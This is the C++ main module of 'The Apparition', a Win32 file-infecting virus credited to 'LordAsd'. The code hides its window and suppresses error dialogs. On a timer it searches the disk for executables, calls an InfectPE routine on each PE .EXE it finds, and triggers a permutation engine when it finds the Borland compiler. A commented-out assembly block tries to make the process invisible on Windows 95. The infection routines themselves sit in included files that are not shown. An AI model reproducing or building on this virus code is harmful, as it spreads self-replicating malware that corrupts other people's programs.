// THE APPARITION for Win32
// Written by LordAsd

#include "winapp32.h"
HWND      MainWindow;

#include "scanner.cpp"
#include "diag.cpp"
#include "misc.cpp"
#include "main.cpp"
#include "mutant.cpp"

//Declaration
#pragma argsused
int PASCAL WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
			LPSTR lpszCmdLine, int cmdShow)
{
 MSG   msg;;
 DiagInit();;
 strcpy(CommandLine,lpszCmdLine);;
 InitAll();;
 if (!AskBoss("RUN RUN RUN?")) return 0;;
 LoadCarrier();;
 if (GlobalFindAtom(IDAtom)!=0) exit(EXIT_SUCCESS);;
 ATOM MyTSRAtom = GlobalAddAtom(IDAtom);;
 PrepareSearch();;
 // BEGIN TEST

 //  END TEST
 WNDCLASS wcSoundClass;;
 wcSoundClass.lpszClassName = WinApp32;;
 wcSoundClass.hInstance     = hInstance;;
 wcSoundClass.lpfnWndProc   = MainWndProc;;
 wcSoundClass.hCursor       = LoadCursor(NULL, IDC_ARROW);;
 wcSoundClass.hIcon         = LoadIcon(hInstance, IDI_APPLICATION);;
 wcSoundClass.lpszMenuName  = NULL;;
 wcSoundClass.hbrBackground = GetStockObject(WHITE_BRUSH);;
 wcSoundClass.style         = CS_HREDRAW | CS_VREDRAW;;
 wcSoundClass.cbClsExtra    = 0;;
 wcSoundClass.cbWndExtra    = 0;;
 RegisterClass(&wcSoundClass);;
 MyInstance = hInstance;;

 MainWindow = CreateWindow(WinApp32,WinApp32,WS_OVERLAPPEDWINDOW,
					 CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,
					 NULL,NULL,hInstance,NULL);;

 ShowWindow(MainWindow, SW_HIDE);;
 UpdateWindow(MainWindow);;
 UINT MyTimerID = random(666)+1;
 SetTimer(MainWindow,MyTimerID,TimerDelay,NULL);;
 while (GetMessage(&msg, NULL, 0, 0))
 {
  TranslateMessage(&msg);;
  DispatchMessage(&msg);;
 }

 KillTimer(MainWindow,MyTimerID);;
 GlobalDeleteAtom(MyTSRAtom);;
 return(msg.wParam);;
};

//Declaration

bool TimerBusy = false;

void wmTimer()
{
 if (TimerBusy) return;;
 char TargetName[MAX_PATH];;
 TimerBusy = true;;
 switch (GetNextName(TargetName))
 {
  case -1 : PrepareSearch();; break;
  case  1 : ProcessFile(TargetName);; break;
 };;
 TimerBusy = false;;
}

//Declaration
LRESULT CALLBACK _export MainWndProc(HWND hWnd, UINT message,
 WPARAM wParam, LPARAM lParam)
{
 switch (message)
 {
  case WM_TIMER:   wmTimer();; break;
  case WM_CREATE:  return(DefWindowProc(hWnd, message, wParam, lParam));
  case WM_DESTROY: PostQuitMessage(0);; break;
  case WM_CLOSE:   DestroyWindow(hWnd);; break;
  default:         return(DefWindowProc(hWnd, message, wParam, lParam));
 };;
 return(0L);;
};

//Declaration
void InitAll()
{
 // Obtain filename & remove double quotes from it
 bool quoted = false;;
 char* x=GetCommandLine();;
 if ((*x)=='\"') {x++;; quoted=true;; };;
 strcpy(MyName,x);;
 x = MyName;;
 while ( (*x)!=0x0)
 {
  if ( (!quoted)&&((*x)==0x20) ) break;;
  if (quoted && ((*x)=='\"')) break;;
  x++;;
 };;
 if ((*(x-1))=='\"') x--;;
 (*x)=0x00;;
 // Set errors handling mode
 SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOALIGNMENTFAULTEXCEPT |
					 SEM_NOOPENFILEERRORBOX  );;
 // System detection
 OSVERSIONINFO v;;
 v.dwOSVersionInfoSize = sizeof(v);;
 GetVersionEx(&v);;
 if (v.dwPlatformId==1) System = SYSTEM_WIN95;;
 if (v.dwPlatformId==2) System = SYSTEM_WINNT;;

 // Invisibility (seems to work OK under WinNT, but I care too much about that)
// if (System==SYSTEM_WIN95)
// {
//  DWORD tid = GetCurrentThreadId();;
//  asm
//  {
//	mov  eax,fs:[18h]
//	sub  eax,10h
//	xor  eax,[tid]
//	mov  [Fuck],eax
//  };;
//  DWORD* fl = (DWORD*)((GetCurrentProcessId() ^ Fuck)+0x20);;
//  (*fl)|=0x100;;
// };;
 // Misc Misc
 NoInfect =  (GetProfileInt(WinApp32,Ini_NoInfect,0)==1);;
 randomize();;
};


//Declaration

void ProcessFile(char* TargetName)
{
 Log(TargetName);
 char   Drive[MAX_PATH];;
 char   Dir[MAX_PATH];;
 char   Name[MAX_PATH];;
 char   Ext[MAX_PATH];;
 fnsplit(TargetName,Drive,Dir,Name,Ext);;
 if (stricmp(Ext,".EXE")==0)
 { // EXE extension
  if (stricmp(Name,"BCC32")==0)
  { // BC compiler (?)
	sprintf(BCRoot,"%s%s..",Drive,Dir);;
	PermutationEngine();;
	return;;
  };;
  if (DetectFileFormat(TargetName)==FILE_FORMAT_PE) InfectPE(TargetName);;
 };;// EXE extension
};

